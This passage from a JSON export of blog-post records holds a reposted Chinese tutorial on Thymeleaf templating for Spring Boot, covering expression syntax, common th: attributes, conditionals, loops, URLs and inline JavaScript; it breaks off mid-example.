			"categories":"java",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2016年09月12日 11:18:45",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"在上篇文章构建微服务：Spring boot 提高篇中简单介绍了一下thymeleaf，这篇文章将更加全面详细的介绍thymeleaf的使用。thymeleaf 是新一代的模板引擎，在spring4.0中推荐使用thymeleaf来做前端模版引擎。前几篇文章地址：\n构建微服务：Spring boot 入门篇\n构建微服务：Spring boot 提高篇\n构建微服务：Spring Boot中Redis的",
			"title":"thymeleaf使用基础教程",
			"type":"repost",
			"content":"<p>在上篇文章<a href=\"http://www.ityouknow.com/spring%20boot/2016/08/03/%E6%9E%84%E5%BB%BA%E5%BE%AE%E6%9C%8D%E5%8A%A1-Spring-boot-%E6%8F%90%E9%AB%98%E7%AF%87.html\">构建微服务：Spring boot 提高篇</a>中简单介绍了一下thymeleaf，这篇文章将更加全面详细的介绍thymeleaf的使用。thymeleaf 是新一代的模板引擎，在spring4.0中推荐使用thymeleaf来做前端模版引擎。</p>\n\n<p>前几篇文章地址：</p>\n\n<ul>\n<li><a href=\"http://www.cnblogs.com/ityouknow/p/5662753.html\">构建微服务：Spring boot 入门篇</a></li>\n<li><a href=\"http://www.ityouknow.com/spring%20boot/2016/08/03/%E6%9E%84%E5%BB%BA%E5%BE%AE%E6%9C%8D%E5%8A%A1-Spring-boot-%E6%8F%90%E9%AB%98%E7%AF%87.html\">构建微服务：Spring boot 提高篇</a></li>\n<li><a href=\"http://www.ityouknow.com/spring%20boot/2016/08/06/%E6%9E%84%E5%BB%BA%E5%BE%AE%E6%9C%8D%E5%8A%A1-Spring-Boot%E4%B8%ADRedis%E7%9A%84%E4%BD%BF%E7%94%A8.html\">构建微服务：Spring Boot中Redis的使用</a></li>\n</ul>\n\n<p><strong>作者：纯洁的微笑</strong> <br>\n <strong>出处：<a href=\"http://www.ityouknow.com/thymeleaf/2016/09/01/%E6%9E%84%E5%BB%BA%E5%BE%AE%E6%9C%8D%E5%8A%A1-thymeleaf%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3.html\">http://www.ityouknow.com/</a></strong></p>\n\n\n\n<h2 id=\"thymeleaf介绍\">thymeleaf介绍</h2>\n\n<p>简单说， Thymeleaf 是一个跟 Velocity、FreeMarker 类似的模板引擎，它可以完全替代 JSP 。相较与其他的模板引擎，它有如下三个极吸引人的特点：</p>\n\n<ul>\n<li><p>1.Thymeleaf 在有网络和无网络的环境下皆可运行，即它可以让美工在浏览器查看页面的静态效果，也可以让程序员在服务器查看带数据的动态页面效果。这是由于它支持 html 原型，然后在 html 标签里增加额外的属性来达到模板+数据的展示方式。浏览器解释 html 时会忽略未定义的标签属性，所以 thymeleaf 的模板可以静态地运行；当有数据返回到页面时，Thymeleaf 标签会动态地替换掉静态内容，使页面动态显示。</p></li>\n<li><p>2.Thymeleaf 开箱即用的特性。它提供标准和spring标准两种方言，可以直接套用模板实现JSTL、 OGNL表达式效果，避免每天套模板、该jstl、改标签的困扰。同时开发人员也可以扩展和创建自定义的方言。</p></li>\n<li><p>3.Thymeleaf 提供spring标准方言和一个与 SpringMVC 完美集成的可选模块，可以快速的实现表单绑定、属性编辑器、国际化等功能。</p></li>\n</ul>\n\n\n\n<h2 id=\"标准表达式语法\">标准表达式语法</h2>\n\n<p>它们分为四类：</p>\n\n<ul>\n<li>1.变量表达式</li>\n<li>2.选择或星号表达式</li>\n<li>3.文字国际化表达式</li>\n<li>4.URL表达式</li>\n</ul>\n\n\n\n<h3 id=\"变量表达式\">变量表达式</h3>\n\n<p>变量表达式即OGNL表达式或Spring EL表达式(在Spring术语中也叫model attributes)。如下所示： <br>\n <code>${session.user.name}</code></p>\n\n<p>它们将以HTML标签的一个属性来表示：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs perl\">&lt;span th:text=<span class=\"hljs-string\">\"<span class=\"hljs-subst\">${book.author.name}</span>\"</span>&gt;  \n&lt;li th:<span class=\"hljs-keyword\">each</span>=<span class=\"hljs-string\">\"book : <span class=\"hljs-subst\">${books}</span>\"</span>&gt;  </code></pre>\n\n\n\n<h3 id=\"选择星号表达式\">选择(星号)表达式</h3>\n\n<p>选择表达式很像变量表达式，不过它们用一个预先选择的对象来代替上下文变量容器(map)来执行，如下： <br>\n <code>*{customer.name}</code></p>\n\n<p>被指定的object由th:object属性定义：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs r\">    &lt;div th:object=<span class=\"hljs-string\">\"${book}\"</span>&gt;  \n      <span class=\"hljs-keyword\">...</span>  \n      &lt;span th:text=<span class=\"hljs-string\">\"*{title}\"</span>&gt;<span class=\"hljs-keyword\">...</span>&lt;/span&gt;  \n      <span class=\"hljs-keyword\">...</span>  \n    &lt;/div&gt;  </code></pre>\n\n\n\n<h3 id=\"文字国际化表达式\">文字国际化表达式</h3>\n\n<p>文字国际化表达式允许我们从一个外部文件获取区域文字信息(.properties)，用Key索引Value，还可以提供一组参数(可选).</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs haml\">    #{<span class=\"ruby\">main.title}</span>  \n    #{<span class=\"ruby\">message.entrycreated(<span class=\"hljs-variable\">${</span>entryId}</span>)}  </code></pre>\n\n<p>可以在模板文件中找到这样的表达式代码：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs r\">    &lt;table&gt;  \n      <span class=\"hljs-keyword\">...</span>  \n      &lt;th th:text=<span class=\"hljs-string\">\"#{header.address.city}\"</span>&gt;<span class=\"hljs-keyword\">...</span>&lt;/th&gt;  \n      &lt;th th:text=<span class=\"hljs-string\">\"#{header.address.country}\"</span>&gt;<span class=\"hljs-keyword\">...</span>&lt;/th&gt;  \n      <span class=\"hljs-keyword\">...</span>  \n    &lt;/table&gt;  </code></pre>\n\n\n\n<h3 id=\"url表达式\">URL表达式</h3>\n\n<p>URL表达式指的是把一个有用的上下文或回话信息添加到URL，这个过程经常被叫做URL重写。 <br>\n <code>@{/order/list}</code> <br>\n URL还可以设置参数： <br>\n <code>@{/order/details(id=${orderId})}</code> <br>\n 相对路径： <br>\n <code>@{../documents/report}</code></p>\n\n<p>让我们看这些表达式：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs xml\">    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">form</span> <span class=\"hljs-attribute\">th:action</span>=<span class=\"hljs-value\">\"@{/createOrder}\"</span>&gt;</span>  \n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">a</span> <span class=\"hljs-attribute\">href</span>=<span class=\"hljs-value\">\"main.html\"</span> <span class=\"hljs-attribute\">th:href</span>=<span class=\"hljs-value\">\"@{/main}\"</span>&gt;</span></code></pre>\n\n\n\n<h3 id=\"变量表达式和星号表达有什么区别吗\">变量表达式和星号表达有什么区别吗？</h3>\n\n<p>如果不考虑上下文的情况下，两者没有区别；星号语法评估在选定对象上表达，而不是整个上下文 <br>\n 什么是选定对象？就是父标签的值，如下：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs xml\">  <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">div</span> <span class=\"hljs-attribute\">th:object</span>=<span class=\"hljs-value\">\"${session.user}\"</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">p</span>&gt;</span>Name: <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">span</span> <span class=\"hljs-attribute\">th:text</span>=<span class=\"hljs-value\">\"*{firstName}\"</span>&gt;</span>Sebastian<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">span</span>&gt;</span>.<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">p</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">p</span>&gt;</span>Surname: <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">span</span> <span class=\"hljs-attribute\">th:text</span>=<span class=\"hljs-value\">\"*{lastName}\"</span>&gt;</span>Pepper<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">span</span>&gt;</span>.<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">p</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">p</span>&gt;</span>Nationality: <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">span</span> <span class=\"hljs-attribute\">th:text</span>=<span class=\"hljs-value\">\"*{nationality}\"</span>&gt;</span>Saturn<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">span</span>&gt;</span>.<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">p</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">div</span>&gt;</span></code></pre>\n\n<p>这是完全等价于：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs xml\">  <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">div</span> <span class=\"hljs-attribute\">th:object</span>=<span class=\"hljs-value\">\"${session.user}\"</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">p</span>&gt;</span>Name: <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">span</span> <span class=\"hljs-attribute\">th:text</span>=<span class=\"hljs-value\">\"${session.user.firstName}\"</span>&gt;</span>Sebastian<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">span</span>&gt;</span>.<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">p</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">p</span>&gt;</span>Surname: <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">span</span> <span class=\"hljs-attribute\">th:text</span>=<span class=\"hljs-value\">\"${session.user.lastName}\"</span>&gt;</span>Pepper<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">span</span>&gt;</span>.<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">p</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">p</span>&gt;</span>Nationality: <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">span</span> <span class=\"hljs-attribute\">th:text</span>=<span class=\"hljs-value\">\"${session.user.nationality}\"</span>&gt;</span>Saturn<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">span</span>&gt;</span>.<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">p</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">div</span>&gt;</span></code></pre>\n\n<p>当然，美元符号和星号语法可以混合使用：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs xml\">  <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">div</span> <span class=\"hljs-attribute\">th:object</span>=<span class=\"hljs-value\">\"${session.user}\"</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">p</span>&gt;</span>Name: <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">span</span> <span class=\"hljs-attribute\">th:text</span>=<span class=\"hljs-value\">\"*{firstName}\"</span>&gt;</span>Sebastian<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">span</span>&gt;</span>.<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">p</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">p</span>&gt;</span>Surname: <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">span</span> <span class=\"hljs-attribute\">th:text</span>=<span class=\"hljs-value\">\"${session.user.lastName}\"</span>&gt;</span>Pepper<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">span</span>&gt;</span>.<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">p</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">p</span>&gt;</span>Nationality: <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">span</span> <span class=\"hljs-attribute\">th:text</span>=<span class=\"hljs-value\">\"*{nationality}\"</span>&gt;</span>Saturn<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">span</span>&gt;</span>.<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">p</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">div</span>&gt;</span></code></pre>\n\n\n\n<h3 id=\"表达式支持的语法\">表达式支持的语法</h3>\n\n\n\n<h4 id=\"字面literals\">字面（Literals）</h4>\n\n<ul>\n<li>文本文字（Text literals）: <code>'one text', 'Another one!',…</code></li>\n<li>数字文本（Number literals）: <code>0, 34, 3.0, 12.3,…</code></li>\n<li>布尔文本（Boolean literals）: <code>true, false</code></li>\n<li>空（Null literal）: <code>null</code></li>\n<li>文字标记（Literal tokens）: <code>one, sometext, main,…</code></li>\n</ul>\n\n\n\n<h4 id=\"文本操作text-operations\">文本操作（Text operations）</h4>\n\n<ul>\n<li>字符串连接(String concatenation): <code>+</code></li>\n<li>文本替换（Literal substitutions）: <code>|The name is ${name}|</code></li>\n</ul>\n\n\n\n<h4 id=\"算术运算arithmetic-operations\">算术运算（Arithmetic operations）</h4>\n\n<ul>\n<li>二元运算符（Binary operators）: <code>+, -, *, /, %</code></li>\n<li>减号（单目运算符）Minus sign (unary operator): <code>-</code></li>\n</ul>\n\n\n\n<h4 id=\"布尔操作boolean-operations\">布尔操作（Boolean operations）</h4>\n\n<ul>\n<li>二元运算符（Binary operators）:<code>and, or</code></li>\n<li>布尔否定（一元运算符）Boolean negation (unary operator):<code>!, not</code></li>\n</ul>\n\n\n\n<h4 id=\"比较和等价comparisons-and-equality\">比较和等价(Comparisons and equality)</h4>\n\n<ul>\n<li>比较（Comparators）: <code>&gt;, &lt;, &gt;=, &lt;= (gt, lt, ge, le)</code></li>\n<li>等值运算符（Equality operators）:<code>==, != (eq, ne)</code></li>\n</ul>\n\n\n\n<h4 id=\"条件运算符conditional-operators\">条件运算符（Conditional operators）</h4>\n\n<ul>\n<li>If-then: <code>(if) ? (then)</code></li>\n<li>If-then-else: <code>(if) ? (then) : (else)</code></li>\n<li>Default: (value) ?: <code>(defaultvalue)</code></li>\n</ul>\n\n<p>所有这些特征可以被组合并嵌套：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs haskell\">'<span class=\"hljs-type\">User</span> is <span class=\"hljs-keyword\">of</span> <span class=\"hljs-typedef\"><span class=\"hljs-keyword\">type</span> ' + <span class=\"hljs-container\">(${<span class=\"hljs-title\">user</span>.<span class=\"hljs-title\">isAdmin</span>()</span>} ? '<span class=\"hljs-type\">Administrator'</span> : <span class=\"hljs-container\">(${<span class=\"hljs-title\">user</span>.<span class=\"hljs-title\">type</span>} ?: '<span class=\"hljs-type\">Unknown</span>')</span>)</span></code></pre>\n\n\n\n<h2 id=\"常用th标签都有那些\">常用th标签都有那些？</h2>\n\n<table>\n<thead>\n<tr>\n  <th>关键字</th>\n  <th>功能介绍</th>\n  <th>案例</th>\n</tr>\n</thead>\n<tbody><tr>\n  <td>th:id</td>\n  <td>替换id</td>\n  <td><code>&lt;input th:id=\"'xxx' + ${collect.id}\"/&gt;</code></td>\n</tr>\n<tr>\n  <td>th:text</td>\n  <td>文本替换</td>\n  <td><code>&lt;p th:text=\"${collect.description}\"&gt;description&lt;/p&gt;</code></td>\n</tr>\n<tr>\n  <td>th:utext</td>\n  <td>支持html的文本替换</td>\n  <td><code>&lt;p th:utext=\"${htmlcontent}\"&gt;conten&lt;/p&gt;</code></td>\n</tr>\n<tr>\n  <td>th:object</td>\n  <td>替换对象</td>\n  <td><code>&lt;div th:object=\"${session.user}\"&gt;</code></td>\n</tr>\n<tr>\n  <td>th:value</td>\n  <td>属性赋值</td>\n  <td><code>&lt;input th:value=\"${user.name}\" /&gt;</code></td>\n</tr>\n<tr>\n  <td>th:with</td>\n  <td>变量赋值运算</td>\n  <td><code>&lt;div th:with=\"isEven=${prodStat.count}%2==0\"&gt;&lt;/div&gt;</code></td>\n</tr>\n<tr>\n  <td>th:style</td>\n  <td>设置样式</td>\n  <td><code>th:style=\"'display:' + @{(${sitrue} ? 'none' : 'inline-block')} + ''\"</code></td>\n</tr>\n<tr>\n  <td>th:onclick</td>\n  <td>点击事件</td>\n  <td><code>th:onclick=\"'getCollect()'\"</code></td>\n</tr>\n<tr>\n  <td>th:each</td>\n  <td>属性赋值</td>\n  <td><code>tr th:each=\"user,userStat:${users}\"&gt;</code></td>\n</tr>\n<tr>\n  <td>th:if</td>\n  <td>判断条件</td>\n  <td><code>&lt;a th:if=\"${userId == collect.userId}\" &gt;</code></td>\n</tr>\n<tr>\n  <td>th:unless</td>\n  <td>和th:if判断相反</td>\n  <td><code>&lt;a th:href=\"@{/login}\" th:unless=${session.user != null}&gt;Login&lt;/a&gt;</code></td>\n</tr>\n<tr>\n  <td>th:href</td>\n  <td>链接地址</td>\n  <td><code>&lt;a th:href=\"@{/login}\" th:unless=${session.user != null}&gt;Login&lt;/a&gt; /&gt;</code></td>\n</tr>\n<tr>\n  <td>th:switch</td>\n  <td>多路选择 配合th:case 使用</td>\n  <td><code>&lt;div th:switch=\"${user.role}\"&gt;</code></td>\n</tr>\n<tr>\n  <td>th:case</td>\n  <td>th:switch的一个分支</td>\n  <td><code>&lt;p th:case=\"'admin'\"&gt;User is an administrator&lt;/p&gt;</code></td>\n</tr>\n<tr>\n  <td>th:fragment</td>\n  <td>布局标签，定义一个代码片段，方便其它地方引用</td>\n  <td><code>&lt;div th:fragment=\"alert\"&gt;</code></td>\n</tr>\n<tr>\n  <td>th:include</td>\n  <td>布局标签，替换内容到引入的文件</td>\n  <td><code>&lt;head th:include=\"layout :: htmlhead\" th:with=\"title='xx'\"&gt;&lt;/head&gt; /&gt;</code></td>\n</tr>\n<tr>\n  <td>th:replace</td>\n  <td>布局标签，替换整个标签到引入的文件</td>\n  <td><code>&lt;div th:replace=\"fragments/header :: title\"&gt;&lt;/div&gt;</code></td>\n</tr>\n<tr>\n  <td>th:selected</td>\n  <td>selected选择框 选中</td>\n  <td><code>th:selected=\"(${xxx.id} == ${configObj.dd})\"</code></td>\n</tr>\n<tr>\n  <td>th:src</td>\n  <td>图片类地址引入</td>\n  <td><code>&lt;img class=\"img-responsive\" alt=\"App Logo\" th:src=\"@{/img/logo.png}\" /&gt;</code></td>\n</tr>\n<tr>\n  <td>th:inline</td>\n  <td>定义js脚本可以使用变量</td>\n  <td><code>&lt;script type=\"text/javascript\" th:inline=\"javascript\"&gt;</code></td>\n</tr>\n<tr>\n  <td>th:action</td>\n  <td>表单提交的地址</td>\n  <td><code>&lt;form action=\"subscribe.html\" th:action=\"@{/subscribe}\"&gt;</code></td>\n</tr>\n<tr>\n  <td>th:remove</td>\n  <td>删除某个属性</td>\n  <td><code>&lt;tr th:remove=\"all\"&gt; 1.all:删除包含标签和所有的孩子。</code></td>\n</tr>\n<tr>\n  <td>th:attr</td>\n  <td>设置标签属性，多个属性可以用逗号分隔</td>\n  <td>比如 <code>th:attr=\"src=@{/image/aa.jpg},title=#{logo}\"</code>，此标签不太优雅，一般用的比较少。</td>\n</tr>\n</tbody></table>\n\n\n<p>还有非常多的标签，这里只列出最常用的几个,由于一个标签内可以包含多个th:x属性，其生效的优先级顺序为: <br>\n <code>include,each,if/unless/switch/case,with,attr/attrprepend/attrappend,value/href,src ,etc,text/utext,fragment,remove。</code></p>\n\n\n\n<h2 id=\"几种常用的使用方法\">几种常用的使用方法</h2>\n\n\n\n<h3 id=\"1赋值字符串拼接\">1、赋值、字符串拼接</h3>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs xml\"> <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">p</span>  <span class=\"hljs-attribute\">th:text</span>=<span class=\"hljs-value\">\"${collect.description}\"</span>&gt;</span>description<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">p</span>&gt;</span>\n <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">span</span> <span class=\"hljs-attribute\">th:text</span>=<span class=\"hljs-value\">\"'Welcome to our application, ' + ${user.name} + '!'\"</span>&gt;</span></code></pre>\n\n<p>字符串拼接还有另外一种简洁的写法</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\">&lt;span th:text=<span class=\"hljs-string\">\"|Welcome to our application, <span class=\"hljs-variable\">${user.name}</span>!|\"</span>&gt;</code></pre>\n\n\n\n<h3 id=\"2条件判断-ifunless\">2、条件判断 If/Unless</h3>\n\n<p>Thymeleaf中使用th:if和th:unless属性进行条件判断，下面的例子中，<code>&lt;a&gt;</code>标签只有在<code>th:if</code>中条件成立时才显示：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">a</span> <span class=\"hljs-attribute\">th:if</span>=<span class=\"hljs-value\">\"${myself=='yes'}\"</span> &gt;</span> <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">i</span>&gt;</span> <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">a</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">a</span> <span class=\"hljs-attribute\">th:unless</span>=<span class=\"hljs-value\">${session.user</span> != <span class=\"hljs-attribute\">null</span>} <span class=\"hljs-attribute\">th:href</span>=<span class=\"hljs-value\">\"@{/login}\"</span> &gt;</span>Login<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">a</span>&gt;</span></code></pre>\n\n<p>th:unless于th:if恰好相反，只有表达式中的条件不成立，才会显示其内容。</p>\n\n<p>也可以使用 <code>(if) ? (then) : (else)</code> 这种语法来判断显示的内容</p>\n\n\n\n<h3 id=\"3for-循环\">3、for 循环</h3>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs xml\">  <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">tr</span>  <span class=\"hljs-attribute\">th:each</span>=<span class=\"hljs-value\">\"collect,iterStat : ${collects}\"</span>&gt;</span> \n     <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">th</span> <span class=\"hljs-attribute\">scope</span>=<span class=\"hljs-value\">\"row\"</span> <span class=\"hljs-attribute\">th:text</span>=<span class=\"hljs-value\">\"${collect.id}\"</span>&gt;</span>1<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">th</span>&gt;</span>\n     <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">td</span> &gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">img</span> <span class=\"hljs-attribute\">th:src</span>=<span class=\"hljs-value\">\"${collect.webLogo}\"</span>/&gt;</span>\n     <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">td</span>&gt;</span>\n     <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">td</span> <span class=\"hljs-attribute\">th:text</span>=<span class=\"hljs-value\">\"${collect.url}\"</span>&gt;</span>Mark<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">td</span>&gt;</span>\n     <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">td</span> <span class=\"hljs-attribute\">th:text</span>=<span class=\"hljs-value\">\"${collect.title}\"</span>&gt;</span>Otto<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">td</span>&gt;</span>\n     <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">td</span> <span class=\"hljs-attribute\">th:text</span>=<span class=\"hljs-value\">\"${collect.description}\"</span>&gt;</span>@mdo<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">td</span>&gt;</span>\n     <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">td</span> <span class=\"hljs-attribute\">th:text</span>=<span class=\"hljs-value\">\"${terStat.index}\"</span>&gt;</span>index<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">td</span>&gt;</span>\n <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">tr</span>&gt;</span></code></pre>\n\n<p>iterStat称作状态变量，属性有：</p>\n\n<ul>\n<li>index:当前迭代对象的index（从0开始计算）</li>\n<li>count: 当前迭代对象的index(从1开始计算)</li>\n<li>size:被迭代对象的大小</li>\n<li>current:当前迭代变量</li>\n<li>even/odd:布尔值，当前循环是否是偶数/奇数（从0开始计算）</li>\n<li>first:布尔值，当前循环是否是第一个</li>\n<li>last:布尔值，当前循环是否是最后一个</li>\n</ul>\n\n\n\n<h3 id=\"4url\">4、URL</h3>\n\n<p>URL在Web应用模板中占据着十分重要的地位，<a href=\"mailto:需要特别注意的是Thymeleaf对于URL的处理是通过语法@%7B\">需要特别注意的是Thymeleaf对于URL的处理是通过语法@{</a>…}来处理的。 <br>\n 如果需要Thymeleaf对URL进行渲染，那么务必使用th:href，th:src等属性，下面是一个例子</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs xml\"><span class=\"hljs-comment\">&lt;!-- Will produce 'http://localhost:8080/standard/unread' (plus rewriting) --&gt;</span>\n <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">a</span>  <span class=\"hljs-attribute\">th:href</span>=<span class=\"hljs-value\">\"@{/standard/{type}(type=${type})}\"</span>&gt;</span>view<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">a</span>&gt;</span>\n\n<span class=\"hljs-comment\">&lt;!-- Will produce '/gtvg/order/3/details' (plus rewriting) --&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">a</span> <span class=\"hljs-attribute\">href</span>=<span class=\"hljs-value\">\"details.html\"</span> <span class=\"hljs-attribute\">th:href</span>=<span class=\"hljs-value\">\"@{/order/{orderId}/details(orderId=${o.id})}\"</span>&gt;</span>view<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">a</span>&gt;</span></code></pre>\n\n<p>设置背景</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">div</span> <span class=\"hljs-attribute\">th:style</span>=<span class=\"hljs-value\">\"'background:url(' + @{/&lt;path-to-image&gt;} + ');'\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">div</span>&gt;</span></code></pre>\n\n<p>根据属性值改变背景</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs actionscript\"> &lt;div <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span>=\"<span class=\"hljs-title\">media</span>-<span class=\"hljs-title\">object</span> <span class=\"hljs-title\">resource</span>-<span class=\"hljs-title\">card</span>-<span class=\"hljs-title\">image</span>\"  <span class=\"hljs-title\">th</span>:<span class=\"hljs-title\">style</span>=\"'<span class=\"hljs-title\">background</span>:<span class=\"hljs-title\">url</span>(' + @{</span>(${collect.webLogo}==<span class=\"hljs-string\">''</span> ? <span class=\"hljs-string\">'img/favicon.png'</span> : ${collect.webLogo})} + <span class=\"hljs-string\">')'</span><span class=\"hljs-string\">\" &gt;&lt;/div&gt;</span></code></pre>\n\n<p>几点说明：</p>\n\n<ul>\n<li>上例中URL最后的<code>(orderId=${o.id})</code> 表示将括号内的内容作为URL参数处理，该语法避免使用字符串拼接，大大提高了可读性</li>\n<li><code>@{...}</code>表达式中可以通过<code>{orderId}</code>访问Context中的orderId变量</li>\n<li><code>@{/order}</code>是Context相关的相对路径，在渲染时会自动添加上当前Web应用的Context名字，假设context名字为app，那么结果应该是/app/order</li>\n</ul>\n\n\n\n<h3 id=\"5内联js\">5、内联js</h3>\n\n<p>内联文本：[[…]]内联文本的表示方式，使用时，必须先用th:inline=”text/javascript/none”激活，th:inline可以在父级标签内使用，甚至作为body的标签。内联文本尽管比th:text的代码少，不利于原型显示。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs lua\">&lt;script th:inline=<span class=\"hljs-string\">\"javascript\"</span>&gt;\n/*&lt;![CDATA[*/\n...\nvar username = /*<span class=\"hljs-string\">[[${sesion.user.name}]]</span>*/ <span class=\"hljs-string\">'Sebastian'</span>;\nvar size = /*<span class=\"hljs-string\">[[${size}]]</span>*/ <span class=\"hljs-number\">0</span>;\n...\n/*]]&gt;*/\n&lt;/script&gt;</code></pre>\n\n<p>js附加代码：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs coffeescript\">/*[+\n<span class=\"hljs-reserved\">var</span> msg = <span class=\"hljs-string\">'This is a working application'</span>;\n+]*/</code></pre>\n\n<p>js移除代码：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs cs\"><span class=\"hljs-comment\">/*[- */</span>\n<span class=\"hljs-keyword\">var</span> msg = <span class=\"hljs-string\">'This is a non-working template'</span>;\n<span class=\"hljs-comment\">/* -]*/</span></code></pre>\n\n\n\n<h3 id=\"6内嵌变量\">6、内嵌变量</h3>\n\n<p>为了模板更加易用，Thymeleaf还提供了一系列Utility对象（内置于Context中），可以通过#直接访问：</p>\n\n<ul>\n<li>dates ： <em>java.util.Date的功能方法类。</em></li>\n<li>calendars : <em>类似#dates，面向java.util.Calendar</em></li>\n<li>numbers : <em>格式化数字的功能方法类</em></li>\n<li>strings : <em>字符串对象的功能类，contains,startWiths,prepending/appending等等。</em></li>\n<li>objects: <em>对objects的功能类操作。</em></li>\n<li>bools: <em>对布尔值求值的功能方法。</em></li>\n<li>arrays：<em>对数组的功能类方法。</em></li>\n<li>lists: <em>对lists功能类方法</em></li>\n<li>sets</li>\n<li>maps <br>\n …</li>\n</ul>\n\n<p>下面用一段代码来举例一些常用的方法：</p>\n\n\n\n<h4 id=\"dates\">dates</h4>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs applescript\">/*\n * Format <span class=\"hljs-type\">date</span> <span class=\"hljs-keyword\">with</span> <span class=\"hljs-keyword\">the</span> specified pattern\n * Also works <span class=\"hljs-keyword\">with</span> arrays, lists <span class=\"hljs-keyword\">or</span> sets\n 